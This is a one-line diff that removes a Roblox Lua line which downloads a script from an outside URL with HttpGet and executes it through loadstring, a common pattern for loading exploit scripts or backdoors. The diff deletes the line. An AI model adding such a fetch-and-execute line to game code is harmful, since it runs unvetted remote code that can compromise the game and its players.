@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://risa.gq/Samuel/Mortem.txt"))()
